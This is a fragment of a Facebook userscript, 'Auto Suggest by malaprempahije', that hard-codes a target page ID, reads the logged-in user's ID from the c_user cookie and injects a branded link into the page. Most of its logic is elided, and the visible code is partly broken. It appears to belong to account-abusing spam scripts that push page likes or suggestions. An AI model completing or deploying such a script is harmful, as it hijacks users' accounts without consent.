// ==UserScript==
// @name            Facebook Auto Suggest By malaprempahije 
// @description     Facebook Auto Suggest by malaprempahije
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @version         malaprempahije 3.1
// ==/UserScript==
...
var spage_id = "514605928552794";
var spost_id = "514605928552794";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Malaprempahije
